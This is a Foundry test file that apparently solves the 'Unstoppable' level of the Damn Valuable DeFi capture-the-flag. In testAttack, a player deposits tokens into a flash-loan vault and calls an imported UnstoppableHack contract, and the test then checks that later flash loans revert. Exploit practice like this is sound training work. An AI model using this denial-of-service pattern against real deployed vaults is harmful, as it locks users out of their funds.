// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import { DamnValuableToken } from "../src/DamnValuableToken.sol";
import { UnstoppableVault } from "../src/unstoppable/UnstoppableVault.sol";
import { ReceiverUnstoppable } from "../src/unstoppable/ReceiverUnstoppable.sol";
import { UnstoppableHack } from "../src/unstoppable/UnstoppableHack.sol";

contract UnstoppableTest is Test {
    DamnValuableToken token;
    UnstoppableVault vault;
    ReceiverUnstoppable receiver;
    UnstoppableHack unstoppableHack;
    address owner;
    address player;
    uint256 balance = 1_000_000 ether;
    uint256 playerBalance = 69 ether;

    function setUp() public {
        // Assign addresses
        owner = makeAddr("tinchoabbate");
        player = makeAddr("player");

        // Instantiate the token and vault contracts
        token = new DamnValuableToken();
        vault = new UnstoppableVault(token, address(owner), address(owner));

        // Sanity check, the vaults asset is the token.
        assertEq(vault.asset() == token, true);

        // Approve the token for balance amount, deposit the 1M tokens to the vault
        token.approve(address(vault), balance);
        vault.deposit(balance, owner);

        // Sanity checks
        assertEq(token.balanceOf(address(vault)) == balance, true);
        assertEq(vault.totalAssets() == balance, true);
        assertEq(vault.totalSupply() == balance, true);
        assertEq(vault.maxFlashLoan(address(token)) == balance, true);

        assertEq(vault.flashFee(address(token), balance - 1) == 0, true);
        assertEq(vault.flashFee(address(token), balance) == 50000 ether, true);

        // Give the player some DVT tokens & sanity check it.
        deal(address(token), player, playerBalance);
        assertEq(token.balanceOf(player) == playerBalance, true);

        // Instantiate the receiver (Borrower) and the hacker contract.
        receiver = new ReceiverUnstoppable(address(vault));
        unstoppableHack = new UnstoppableHack(address(vault));
    }


    function testAttack() public {

        console.log(vault.totalAssets() / 1e18, vault.totalSupply() / 1e18);

        vm.startPrank(player);
        token.approve(address(vault), playerBalance);

        vault.deposit(playerBalance, address(unstoppableHack));
        console.log(vault.totalAssets() / 1e18, vault.totalSupply() / 1e18);

        unstoppableHack.attack(1 ether);
        console.log(vault.totalAssets() / 1e18, vault.totalSupply() / 1e18);

        vm.expectRevert();
        receiver.executeFlashLoan(420 ether);
        console.log(unicode"\n🎉🥳 Congratulations, you beat the level!!! 🥳🎉");
    }
}